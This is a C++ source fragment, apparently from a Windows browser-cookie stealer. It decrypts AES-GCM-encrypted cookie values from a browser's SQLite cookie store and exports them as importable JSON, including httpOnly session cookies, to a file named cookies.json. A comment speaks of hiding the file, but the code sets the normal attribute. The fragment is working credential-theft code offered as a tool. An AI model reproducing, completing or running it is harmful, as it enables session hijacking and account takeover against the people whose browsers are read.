            const byte* nonce = data + 3;
            const byte* ciphertext = data + 3 + 12;
            int ciphertext_len = enc_val_len - 3 - 12 - 16;
            const byte* tag = data + enc_val_len - 16;

            string plaintext;
            try {
                GCM<AES>::Decryption d;
                d.SetKeyWithIV(key.data(), key.size(), nonce, 12);
                AuthenticatedDecryptionFilter df(d, new StringSink(plaintext),
                    AuthenticatedDecryptionFilter::THROW_EXCEPTION, 16);

                df.ChannelPut("", ciphertext, ciphertext_len);
                df.ChannelPut("", tag, 16);
                df.ChannelMessageEnd("");
            }
            catch (const exception&) {
                continue;
            }

            // Trim at null terminator (if present)
            auto null_pos = plaintext.find('\0');
            if (null_pos != string::npos) {
                plaintext.erase(null_pos);
            }

            // Ensure printable or fallback to hex
            string safeValue = isPrintable(plaintext) ? plaintext : toHex(plaintext);

            Json::Value cookie;
            cookie["domain"] = host_key;
            cookie["expirationDate"] = Json::UInt64(expires_utc);
            cookie["httpOnly"] = (is_httponly != 0);
            cookie["name"] = name;
            cookie["path"] = path;
            cookie["samesite"] = samesite;
            cookie["secure"] = (is_secure != 0);
            cookie["value"] = safeValue;
            cookie["storeId"] = "0";
            cookie["hostOnly"] = false;
            cookie["id"] = count;

            cookies.append(cookie);
            count++;
        }

        sqlite3_finalize(stmt);
        sqlite3_close(db);

        Json::StreamWriterBuilder writerBuilder;
        writerBuilder["indentation"] = "";
        unique_ptr<Json::StreamWriter> writer(writerBuilder.newStreamWriter());

        ofstream out("cookies.json");
        writer->write(cookies, &out);
        out.close();

        if (SetFileAttributes(L"cookies.json", FILE_ATTRIBUTE_NORMAL) == 0) {
            cerr << "Warning: Could not set hidden attribute for cookies.json.\n";
        }

        cout << "Cookies decrypted and saved successfully! Total: " << count << endl;
       

    return 0;
}
